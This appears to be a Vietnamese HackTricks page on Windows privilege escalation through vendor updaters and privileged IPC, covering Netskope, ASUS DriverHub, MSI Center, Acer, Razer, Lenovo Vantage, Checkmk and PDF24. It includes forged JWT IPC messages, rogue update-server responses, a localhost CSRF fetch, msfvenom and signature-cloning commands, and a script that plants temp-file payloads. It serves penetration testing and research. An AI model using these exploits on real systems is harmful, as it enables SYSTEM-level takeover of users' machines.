# Lạm dụng trình tự cập nhật doanh nghiệp và IPC đặc quyền (ví dụ: Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Trang này khái quát một nhóm chuỗi leo thang đặc quyền cục bộ trên Windows, được tìm thấy trong các agent và trình cập nhật endpoint doanh nghiệp có bề mặt IPC dễ tiếp cận và quy trình cập nhật đặc quyền. Một ví dụ tiêu biểu là Netskope Client for Windows < R129 (CVE-2025-0309), trong đó người dùng có đặc quyền thấp có thể ép quá trình đăng ký kết nối đến máy chủ do kẻ tấn công kiểm soát, rồi gửi một MSI độc hại để dịch vụ SYSTEM cài đặt.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Các ý tưởng chính có thể áp dụng với những sản phẩm tương tự:
- Lạm dụng IPC localhost của dịch vụ đặc quyền để buộc đăng ký lại hoặc cấu hình lại nhằm kết nối đến máy chủ của kẻ tấn công.
- Triển khai các endpoint cập nhật của nhà cung cấp, gửi một Trusted Root CA giả mạo và trỏ trình cập nhật đến một gói độc hại được “ký”.
- Vượt qua các bước kiểm tra signer yếu (allow-list CN), cờ digest tùy chọn và thuộc tính MSI lỏng lẻo.
- Nếu IPC được “mã hóa”, suy ra key/IV từ các định danh máy có thể đọc công khai được lưu trong registry.
- Nếu dịch vụ giới hạn caller theo đường dẫn image/tên process, hãy inject vào một process nằm trong allow-list hoặc tạo process ở trạng thái suspended rồi bootstrap DLL bằng một bản vá thread-context tối giản.

Các dịch vụ TCP cục bộ tùy chỉnh cũng cần được rà soát về danh tính và ranh giới đầu vào, ngay cả khi chúng yêu cầu PIN hoặc thông tin xác thực ứng dụng khác. Xác định process và tài khoản dịch vụ hiệu lực của listener, sau đó kiểm tra chính xác binary/version đang triển khai và xem các trường do caller kiểm soát có được kiểm tra độ dài trước khi sao chép vào buffer cố định hoặc dùng để tạo lệnh cho child process hay không. [Hướng dẫn của Microsoft về buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) giải thích vì sao đầu vào bên ngoài không được kiểm tra có thể gây nguy hiểm trong mã native có đặc quyền. Listener loopback, thông tin xác thực hardcode hoặc riêng tên process không chứng minh được có memory corruption hay thực thi với quyền SYSTEM; khả năng truy cập, authorization, code path và các biện pháp giảm thiểu vẫn là những điều kiện riêng biệt. Khi liệt kê thông thường, hãy giữ thao tác ở trạng thái thụ động, thay vì gửi đầu vào có độ dài gây crash đến dịch vụ đang hoạt động.

---
## 1) Buộc đăng ký kết nối đến máy chủ của kẻ tấn công qua localhost IPC

Nhiều agent đi kèm một process UI ở user-mode giao tiếp với dịch vụ SYSTEM qua localhost TCP bằng JSON.

Quan sát được ở Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Quy trình khai thác:
1) Tạo JWT enrollment token có các claim kiểm soát host backend (ví dụ: AddonUrl). Dùng alg=None để không cần chữ ký.
2) Gửi thông điệp IPC gọi lệnh provisioning cùng với JWT và tên tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Service bắt đầu gửi yêu cầu đến server giả mạo của bạn để enrollment/config, ví dụ:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Lưu ý:
- Nếu việc xác minh caller dựa trên path/name, hãy tạo yêu cầu từ một vendor binary nằm trong allowlist (xem §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC quản lý có thể truy cập qua mạng

Ranh giới tin cậy này không phải lúc nào cũng chỉ giới hạn ở localhost. Trong trường hợp MyReport Updater 2.1.1 được báo cáo, một service `LocalSystem` lắng nghe trên tất cả các interface và chấp nhận yêu cầu thay đổi cấu hình gRPC không cần xác thực đối với reference host, port và operating mode. Biến thể từ xa yêu cầu cả quyền truy cập mạng đến listener lẫn quyền truy cập outbound từ service đến reference đã chọn. Hãy đánh giá riêng các điều kiện này, không gộp với việc luồng package về sau có thể vượt qua ranh giới ghi file hay không.<sup>[[16]](#references)</sup>

---
## 2) Chiếm quyền update channel để chạy code dưới quyền SYSTEM

Khi client bắt đầu giao tiếp với server của bạn, hãy triển khai các endpoint mà nó mong đợi và hướng client đến một MSI do attacker kiểm soát. Trình tự thường gặp:

1) /v2/config/org/clientconfig → Trả về cấu hình JSON với updater interval rất ngắn, ví dụ:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Trả về chứng chỉ CA dạng PEM. Service cài chứng chỉ này vào kho Trusted Root của Local Machine.
3) /v2/checkupdate → Cung cấp metadata trỏ đến một MSI độc hại và phiên bản giả.

Vượt qua các bước kiểm tra phổ biến ngoài thực tế:
- Allow-list Signer CN: service có thể chỉ kiểm tra Subject CN có bằng “netSkope Inc” hoặc “Netskope, Inc.” hay không. Rogue CA của bạn có thể cấp một leaf certificate mang CN đó và ký MSI.
- Thuộc tính CERT_DIGEST: thêm một thuộc tính MSI vô hại có tên CERT_DIGEST. Không có bước thực thi kiểm tra khi cài đặt.
- Tùy chọn kiểm tra digest: cờ cấu hình (ví dụ: check_msi_digest=false) vô hiệu hóa xác thực mật mã bổ sung.

Kết quả: service chạy với quyền SYSTEM cài MSI từ
C:\ProgramData\Netskope\stAgent\data\*.msi
và thực thi mã tùy ý với quyền NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Bài học về patch-bypass: nếu vendor phản hồi bằng cách allow-list một số ít domain “đáng tin cậy” thay vì xác thực nguồn cập nhật bằng mật mã, hãy tìm redirector hoặc reverse proxy thuộc sở hữu của vendor mà bạn vẫn có thể dùng để điều hướng traffic. Trong trường hợp của Netskope, nghiên cứu công khai sau đó cho thấy allow-list thời R129 vẫn có thể bị khai thác thông qua `rproxy.goskope.com`, vốn proxy nội dung Azure App Service do attacker kiểm soát. Hãy xem hostname allow-list là một trở ngại nhỏ, không phải ranh giới tin cậy.<sup>[[14]](#references)</sup>

Một kiểu lỗi khác là **metadata gói nhất quán với nhau nhưng không được xác thực**. Trong trường hợp MyReport, một tham chiếu do attacker kiểm soát đã phân phối archive bị sửa đổi, trong khi một intermediary thay đổi các phản hồi về digest MD5 và kích thước của vendor trước khi chúng đến updater. Việc các giá trị khớp nhau chỉ xác minh tính nhất quán của phản hồi, chứ không xác minh nguồn gốc từ vendor; không cần đến va chạm MD5. Thư mục cài đặt do caller chọn sau đó biến thao tác giải nén với quyền cao thành ranh giới ghi file. Primitive nạp DLL thu được được đề cập trong [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Forging encrypted IPC requests (when present)

Từ R127, Netskope bọc JSON IPC trong trường encryptData có dạng Base64. Phân tích ngược cho thấy hệ thống dùng AES với key/IV được suy ra từ các giá trị registry mà mọi user đều có thể đọc:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attacker có thể tái tạo quá trình mã hóa và gửi các lệnh mã hóa hợp lệ từ một standard user.<sup>[[1]](#references)[[2]](#references)</sup> Mẹo chung: nếu một agent đột nhiên “mã hóa” IPC, hãy tìm device ID, product GUID, install ID trong HKLM được dùng làm dữ liệu đầu vào.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Một số service cố xác thực peer bằng cách xác định PID của kết nối TCP rồi so sánh image path/name với các binary vendor trong allow-list, nằm dưới Program Files (ví dụ: stagentui.exe, bwansvc.exe, epdlp.exe).

Hai cách bypass thực tế:
- DLL injection vào một process trong allow-list (ví dụ: nsdiag.exe) rồi proxy IPC từ bên trong process đó.
- Khởi chạy một binary trong allow-list ở trạng thái suspended rồi nạp proxy DLL của bạn mà không dùng CreateRemoteThread (xem §5), qua đó đáp ứng các quy tắc chống can thiệp do driver thực thi.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Sản phẩm thường đi kèm một driver minifilter/OB callbacks (ví dụ: Stadrv) để loại bỏ các quyền nguy hiểm khỏi handle trỏ đến process được bảo vệ:
- Process: loại bỏ PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: giới hạn quyền còn THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Một user-mode loader đáng tin cậy, tuân thủ các giới hạn này:
1) CreateProcess một binary của vendor với CREATE_SUSPENDED.
2) Lấy các handle mà bạn vẫn được phép dùng: PROCESS_VM_WRITE | PROCESS_VM_OPERATION trên process, và handle thread có THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (hoặc chỉ THREAD_RESUME nếu bạn patch code tại một RIP đã biết).
3) Ghi đè ntdll!NtContinue (hoặc một thunk khác được map sớm và đảm bảo luôn có mặt) bằng một stub ngắn gọi LoadLibraryW với đường dẫn DLL của bạn, rồi nhảy trở lại.
4) Gọi ResumeThread để kích hoạt stub bên trong process, qua đó nạp DLL của bạn.

Vì bạn chưa từng dùng PROCESS_CREATE_THREAD hoặc PROCESS_SUSPEND_RESUME trên một process đã được bảo vệ (bạn tự tạo process đó), nên cách này đáp ứng chính sách của driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN (plugin Netskope) tự động hóa việc tạo rogue CA, ký MSI độc hại và cung cấp các endpoint cần thiết: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope là IPC client tùy chỉnh, tạo các thông điệp IPC tùy ý (có thể mã hóa AES) và tích hợp kỹ thuật injection bằng suspended process để gửi lệnh từ một binary trong allow-list.<sup>[[4]](#references)</sup>

## 7) Fast triage workflow for unknown updater/IPC surfaces

Khi gặp một endpoint agent mới hoặc bộ “helper” của motherboard, một quy trình nhanh thường đủ để xác định liệu đây có phải là mục tiêu privesc tiềm năng hay không:<sup>[[6]](#references)</sup>

1) Liệt kê các loopback listener và xác định process vendor tương ứng:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Liệt kê các named pipe ứng viên:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Khai thác dữ liệu định tuyến được lưu trong registry và được các máy chủ IPC dựa trên plugin sử dụng:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Trích xuất tên endpoint, khóa JSON và ID lệnh trước tiên từ client chạy ở chế độ user. Các frontend Electron/.NET được đóng gói thường làm lộ toàn bộ schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Tìm điều kiện xác định độ tin cậy thực sự, không chỉ đường đi trong code cuối cùng khởi chạy tiến trình:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Các pattern đáng ưu tiên:
- `CryptQueryObject`/phân tích chứng chỉ mà không có `WinVerifyTrust` thường có nghĩa là “chứng chỉ tồn tại” đã bị xem như “chứng chỉ đáng tin cậy”, cho phép clone chứng chỉ hoặc dùng các thủ thuật giả mạo signer khác.
- Kiểm tra chuỗi con/hậu tố trên `Origin`, `Referer`, URL tải xuống, tên tiến trình hoặc CN của signer không phải là xác thực. `contains(".vendor.com")` thường có thể bị khai thác bằng các domain giả mạo do attacker kiểm soát.
- Nếu GUI có quyền thấp quyết định “tệp đáng tin cậy” còn SYSTEM broker chỉ sử dụng kết quả đó, thì patch hoặc triển khai lại DLL/JS phía client thường có thể vượt qua hoàn toàn ranh giới này (kiểu phân tách kiểm tra của Razer).
- Nếu broker sao chép payload vào `%TEMP%`/`C:\Windows\Temp`, rồi mới xác thực hoặc lên lịch chạy từ đường dẫn đó, hãy kiểm tra ngay các khoảng thời gian có thể thay thế TOCTOU và các module plugin cùng thư mục có cung cấp wrapper `ExecuteTask()` khác với kiểm tra yếu hơn hay không.<sup>[[6]](#references)</sup>

Với các mục tiêu sử dụng nhiều named pipe, PipeViewer là cách nhanh để phát hiện DACL yếu và các pipe có thể truy cập từ xa trước khi bắt đầu reverse protocol chuyên sâu.<sup>[[11]](#references)</sup>

Nếu mục tiêu chỉ xác thực caller bằng PID, đường dẫn image hoặc tên tiến trình, hãy xem đó là chướng ngại nhỏ chứ không phải ranh giới bảo mật: inject vào client hợp lệ hoặc tạo kết nối từ một tiến trình nằm trong allow-list thường là đủ để vượt qua các kiểm tra của server. Riêng với named pipe, [trang này về client impersonation và pipe abuse](named-pipe-client-impersonation.md) trình bày kỹ hơn về primitive này.

Với **broker cleanup hoặc restore có quyền cao**, hãy kiểm tra ranh giới tin cậy của đường dẫn cũng như ACL của pipe. Caller có quyền thấp hơn có thể chọn đích restore hoặc đổi tên artifact backup đã được stage trong một thư mục dùng chung, ngay cả khi executable của service và thư mục cài đặt được bảo vệ. Hãy xác nhận riêng rằng caller có thể gọi lệnh restore, sửa chính xác input hoặc tên tệp đã stage, broker chạy dưới một identity có quyền cao hơn, và thao tác restore thực sự ghi vào đường dẫn được bảo vệ mà caller đã chọn. Chỉ riêng việc thư mục staging có quyền ghi hoặc pipe có thể đọc được không chứng minh được khả năng ghi tùy ý với quyền cao; cần code review hoặc kiểm thử có kiểm soát để xác minh ánh xạ đích và hành vi của service. Không gọi một lệnh cleanup chưa rõ chức năng trong quá trình enumeration thụ động vì lệnh đó có thể xóa tệp của người dùng.

---
## 8) Broker add-in dạng module chỉ xác thực bằng chữ ký của vendor (kiểu Lenovo Vantage)

Một biến thể mới đáng săn tìm là **broker RPC dùng client đã ký**: một tiến trình desktop Lenovo-signed có quyền thấp giao tiếp với service SYSTEM, và service định tuyến các lệnh JSON đến một tập hợp add-in được mô tả bằng XML trong `%ProgramData%`. Khi đã đạt được code execution **bên trong bất kỳ client đã ký nào được chấp nhận**, mọi contract có `runas="system"` đều trở thành attack surface của bạn.<sup>[[15]](#references)</sup>

Các primitive giá trị cao được ghi nhận trong nghiên cứu Lenovo Vantage:
- **Tin tưởng caller vì được vendor ký**: các nhà nghiên cứu đã đạt được context đã xác thực bằng cách sao chép một EXE Lenovo-signed vào thư mục có quyền ghi và đáp ứng điều kiện DLL side-load (`profapi.dll`), khiến mã tùy ý chạy bên trong một client mà service đã tin cậy.
- **Khám phá attack surface dựa trên manifest**: add-in được khai báo trong `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; một số contract chạy dưới quyền `SYSTEM`, vì vậy enumeration các manifest này thường nhanh chóng làm lộ các verb có quyền cao thực sự, nhanh hơn reverse chính broker.
- **Lỗi riêng lẻ của từng command nằm sau kênh đã xác thực**: sau khi vào được client đáng tin cậy, các nghiên cứu công khai đã phát hiện path traversal kết hợp race condition trong các verb update/install, lạm dụng raw-SQL trong database cài đặt có quyền cao, và kiểm tra đường dẫn registry dựa trên chuỗi con cho phép ghi ra ngoài hive dự kiến.

Recon hữu ích trên mục tiêu:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Bài học thực tiễn: bất cứ khi nào một bộ công cụ trợ giúp cung cấp broker trước tiên xác thực **tiến trình gọi** rồi mới phân phối yêu cầu đến hàng chục lệnh plugin/add-in, đừng dừng lại sau khi bypass bước kiểm tra độ tin cậy đầu tiên. Hãy trích xuất bảng manifest/contract và fuzz riêng từng lệnh có đặc quyền cao; kênh đã xác thực thường che giấu một số lỗi ở giai đoạn thứ hai.

---
## 1) CSRF từ trình duyệt đến localhost nhằm vào các API HTTP có đặc quyền (ASUS DriverHub)

DriverHub cài đặt một dịch vụ HTTP chạy ở chế độ user (ADU.exe) trên 127.0.0.1:53000, dịch vụ này chấp nhận các lệnh gọi từ trình duyệt có nguồn gốc https://driverhub.asus.com. Bộ lọc origin chỉ thực hiện `string_contains(".asus.com")` trên header Origin và trên các URL tải xuống được cung cấp qua `/asus/v1.0/*`. Vì vậy, bất kỳ máy chủ nào do kẻ tấn công kiểm soát, chẳng hạn như `https://driverhub.asus.com.attacker.tld`, đều vượt qua bước kiểm tra và có thể gửi các yêu cầu làm thay đổi trạng thái bằng JavaScript.<sup>[[6]](#references)</sup> Xem [kiến thức cơ bản về CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) để biết thêm các cách bypass.

Quy trình thực tế:
1) Đăng ký một tên miền có chứa `.asus.com` và lưu trữ một trang web độc hại trên đó.
2) Dùng `fetch` hoặc XHR để gọi một endpoint có đặc quyền (ví dụ: `Reboot`, `UpdateApp`) trên `http://127.0.0.1:53000`.
3) Gửi phần thân JSON mà handler mong đợi – mã JS frontend đã đóng gói cho thấy schema bên dưới.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Ngay cả PowerShell CLI được hiển thị bên dưới cũng hoạt động thành công khi header Origin bị giả mạo thành giá trị đáng tin cậy:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Do đó, mọi lượt truy cập của trình duyệt vào trang của kẻ tấn công đều trở thành một CSRF cục bộ chỉ cần 1 lần nhấp (hoặc 0 lần nhấp thông qua `onload`), điều khiển một helper chạy dưới quyền SYSTEM.

---
## 2) Xác minh chữ ký mã không an toàn & sao chép chứng chỉ (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` tải xuống các tệp thực thi tùy ý được khai báo trong phần thân JSON và lưu vào bộ nhớ đệm tại `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Việc xác thực URL tải xuống dùng lại cùng logic kiểm tra chuỗi con, nên `http://updates.asus.com.attacker.tld:8000/payload.exe` được chấp nhận. Sau khi tải xuống, ADU.exe chỉ kiểm tra PE có chữ ký và chuỗi Subject khớp với ASUS trước khi chạy — không có `WinVerifyTrust` hay xác thực chuỗi chứng chỉ.

Để khai thác luồng này:
1) Tạo payload (ví dụ: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sao chép signer của ASUS vào payload (ví dụ: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Lưu trữ `pwn.exe` trên một domain giả mạo `.asus.com` và kích hoạt UpdateApp thông qua browser CSRF ở trên.

Vì cả bộ lọc Origin và URL đều dựa trên chuỗi con, còn kiểm tra signer chỉ so sánh chuỗi, DriverHub tải xuống và thực thi binary của kẻ tấn công trong ngữ cảnh có đặc quyền cao.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU trong các đường dẫn sao chép/thực thi của updater (MSI Center CMD_AutoUpdateSDK)

Dịch vụ SYSTEM của MSI Center cung cấp một giao thức TCP, trong đó mỗi frame có định dạng `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Component cốt lõi (Component ID `0f 27 00 00`) có `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Trình xử lý của nó:
1) Sao chép tệp thực thi được cung cấp vào `C:\Windows\Temp\MSI Center SDK.exe`.
2) Xác minh chữ ký thông qua `CS_CommonAPI.EX_CA::Verify` (subject của chứng chỉ phải bằng “MICRO-STAR INTERNATIONAL CO., LTD.” và `WinVerifyTrust` phải thành công).
3) Tạo scheduled task chạy tệp tạm dưới quyền SYSTEM với các đối số do kẻ tấn công kiểm soát.

Tệp được sao chép không bị khóa giữa lúc xác minh và `ExecuteTask()`. Kẻ tấn công có thể:
- Gửi Frame A trỏ đến một binary được MSI ký hợp lệ (đảm bảo kiểm tra chữ ký thành công và task được lên lịch).
- Gửi liên tục các thông điệp Frame B để chạy đua, trỏ đến payload độc hại và ghi đè `MSI Center SDK.exe` ngay sau khi quá trình xác minh hoàn tất.

Khi scheduler kích hoạt, nó thực thi payload đã bị ghi đè dưới quyền SYSTEM dù ban đầu đã xác minh một tệp khác. Khai thác ổn định bằng cách dùng hai goroutine/thread gửi liên tục CMD_AutoUpdateSDK cho đến khi thắng được cửa sổ TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Khai thác IPC tùy chỉnh cấp SYSTEM & impersonation (MSI Center + Acer Control Centre)

### Các bộ lệnh TCP của MSI Center
- Mỗi plugin/DLL được `MSI.CentralServer.exe` tải sẽ nhận một Component ID được lưu trong `HKLM\SOFTWARE\MSI\MSI_CentralServer`. 4 byte đầu tiên của frame chọn component đó, cho phép kẻ tấn công định tuyến lệnh đến các module tùy ý.
- Plugin có thể định nghĩa task runner riêng. `Support\API_Support.dll` cung cấp `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` và gọi trực tiếp `API_Support.EX_Task::ExecuteTask()` mà **không xác thực chữ ký** — bất kỳ người dùng cục bộ nào cũng có thể trỏ nó đến `C:\Users\<user>\Desktop\payload.exe` để thực thi dưới quyền SYSTEM một cách ổn định.
- Dùng Wireshark để sniff loopback hoặc instrument các binary .NET trong dnSpy sẽ nhanh chóng làm lộ ánh xạ Component ↔ command; sau đó có thể dùng client Go/Python tùy chỉnh để phát lại các frame.<sup>[[6]](#references)</sup>

### Named pipe của Acer Control Centre & các mức impersonation
- `ACCSvc.exe` (SYSTEM) cung cấp `\\.\pipe\treadstone_service_LightMode`, và discretionary ACL của nó cho phép client từ xa (ví dụ: `\\TARGET\pipe\treadstone_service_LightMode`). Gửi command ID `7` kèm đường dẫn tệp sẽ gọi routine tạo tiến trình của service.
- Thư viện client tuần tự hóa một byte kết thúc đặc biệt (113) cùng với các đối số. Instrument động bằng Frida/`TsDotNetLib` (xem [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) để biết các mẹo instrumentation) cho thấy handler native ánh xạ giá trị này thành một `SECURITY_IMPERSONATION_LEVEL` và integrity SID trước khi gọi `CreateProcessAsUser`.
- Thay 113 (`0x71`) bằng 114 (`0x72`) sẽ chuyển sang nhánh chung, giữ nguyên token SYSTEM đầy đủ và đặt SID mức toàn vẹn cao (`S-1-16-12288`). Do đó, binary được tạo chạy với quyền SYSTEM không hạn chế, cả cục bộ lẫn qua máy khác.
- Kết hợp với cờ installer được để lộ (`Setup.exe -nocheck`) để cài ACC ngay cả trên VM lab và kiểm tra pipe mà không cần phần cứng của nhà cung cấp.<sup>[[6]](#references)</sup>

Các lỗi IPC này cho thấy vì sao dịch vụ localhost phải thực thi xác thực hai chiều (ALPC SIDs, bộ lọc `ImpersonationLevel=Impersonation`, lọc token), và vì sao helper “chạy binary tùy ý” của mọi module phải dùng chung quy trình xác minh signer.

---
## 3) Helper “elevator” COM/IPC dựa trên xác thực yếu ở user mode (Razer Synapse 4)

Razer Synapse 4 bổ sung một pattern hữu ích khác thuộc nhóm này: người dùng có đặc quyền thấp có thể yêu cầu một helper COM khởi chạy tiến trình thông qua `RzUtility.Elevator`, trong khi quyết định tin cậy được giao cho một DLL user-mode (`simple_service.dll`) thay vì được thực thi chặt chẽ bên trong ranh giới đặc quyền.

Quy trình khai thác được ghi nhận:
- Khởi tạo đối tượng COM `RzUtility.Elevator`.
- Gọi `LaunchProcessNoWait(<path>, "", 1)` để yêu cầu khởi chạy với quyền cao.
- Trong public PoC, kiểm tra chữ ký PE bên trong `simple_service.dll` bị patch bỏ trước khi gửi yêu cầu, cho phép khởi chạy một tệp thực thi tùy ý do kẻ tấn công chọn.<sup>[[6]](#references)[[10]](#references)</sup>

Lệnh gọi PowerShell tối giản:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Bài học tổng quát: khi reverse các bộ công cụ “helper”, đừng chỉ kiểm tra TCP localhost hoặc named pipes. Hãy kiểm tra các lớp COM có tên như `Elevator`, `Launcher`, `Updater` hoặc `Utility`, rồi xác minh xem service có đặc quyền thực sự tự xác thực binary đích hay chỉ tin vào kết quả do DLL client user-mode có thể bị patch tính toán. Mô hình này không chỉ giới hạn ở Razer: mọi thiết kế phân tách mà broker có đặc quyền cao nhận quyết định allow/deny từ phía có đặc quyền thấp đều có thể là bề mặt privesc.


---
## Thực thi script temp có thể dự đoán trong quá trình sửa chữa MSI (Checkmk Agent / CVE-2024-0670)

Một số agent Windows vẫn thực hiện các hành động có đặc quyền bằng cách ghi một file `.cmd` tạm vào `C:\Windows\Temp` rồi chạy file đó với quyền `SYSTEM`. Nếu tên file có thể dự đoán và service không tạo lại file hiện có một cách an toàn, người dùng có đặc quyền thấp có thể tạo trước file temp sắp được dùng với thuộc tính **chỉ đọc**, khiến tiến trình có đặc quyền chạy nội dung do attacker kiểm soát thay vì script của chính nó.

Đã ghi nhận trong các bản Checkmk Agent có lỗ hổng:
- mẫu temp: `cmk_all_<PID>_1.cmd`
- các nhánh bị ảnh hưởng: `2.0.0`, `2.1.0`, `2.2.0`
- cách kích hoạt: **sửa chữa** gói agent MSI đã lưu trong cache<sup>[[8]](#references)[[9]](#references)</sup>

Quy trình thực tế:
1. Ước tính một dải PID hợp lý dựa trên các PID tiến trình hiện tại hoặc PID của agent đang chạy.
2. Ghi một payload `.cmd` **ASCII** ngắn (`Set-Content -Encoding Ascii` hoặc chuyển hướng đầu ra từ `cmd.exe`; tránh đầu ra PowerShell mã hóa UTF-16 cho các file batch).
3. Rải các file `C:\Windows\Temp\cmk_all_<PID>_1.cmd` trên dải PID có khả năng xảy ra và đánh dấu từng file là chỉ đọc.
4. Kích hoạt sửa chữa MSI đã lưu trong cache để service có đặc quyền tìm cách tạo lại rồi thực thi script temp.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Nếu sản phẩm có lỗ hổng được cài đặt bằng Windows Installer, hãy xác định tên sản phẩm tương ứng với tệp MSI được lưu trong bộ nhớ đệm có tên trông ngẫu nhiên trong `C:\Windows\Installer` trước khi kích hoạt quá trình sửa chữa:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Ghi chú vận hành:
- `qwinsta` hữu ích khi `msiexec /fa` thất bại trong WinRM shell không tương tác và bạn cần xác định liệu một phiên desktop hiện có/đã ngắt kết nối có thể kích hoạt quá trình repair đúng cách hay không.<sup>[[7]](#references)</sup>
- Mô hình này cũng áp dụng cho các endpoint agent và updater khác có **staging script tạm trong các vị trí world-writable rồi thực thi chúng dưới quyền SYSTEM**. Kiểm tra tên có thể dự đoán, thiếu cơ chế tạo file độc quyền và các luồng repair/update có thể được kích hoạt theo yêu cầu.

### Repair installer tương tác và console đặc quyền

PDF24 Creator 11.15.1 cho thấy một rủi ro riêng khi MSI repair: custom action cài máy in có thể mở một console hiển thị với quyền SYSTEM trong lúc repair. Nhà cung cấp đã thay đổi MSI installer ở phiên bản 11.15.2 để xử lý hành vi này. Phiên bản sản phẩm cũ chỉ là manh mối để phân loại. Hãy kiểm tra gói MSI đã đăng ký hoặc có thể truy cập, liệu người dùng này có thể bắt đầu repair hay không, custom action dễ bị khai thác và độ trễ ghi file log có hiện diện hay không, và liệu desktop tương tác có thể hiển thị console hay không. Độ trễ được báo cáo sử dụng oplock trên `faxPrnInst.log`; quyền ghi file thông thường không phải điều kiện truy cập duy nhất. Shell không tương tác, gói không thể truy cập hoặc installer đã được vá đều có thể làm đứt chuỗi tấn công. Vấn đề này không phụ thuộc vào `AlwaysInstallElevated` và khác với việc thay thế một script tạm có tên dễ đoán.

---
## Chiếm quyền chuỗi cung ứng từ xa qua xác thực updater yếu (WinGUp / Notepad++)

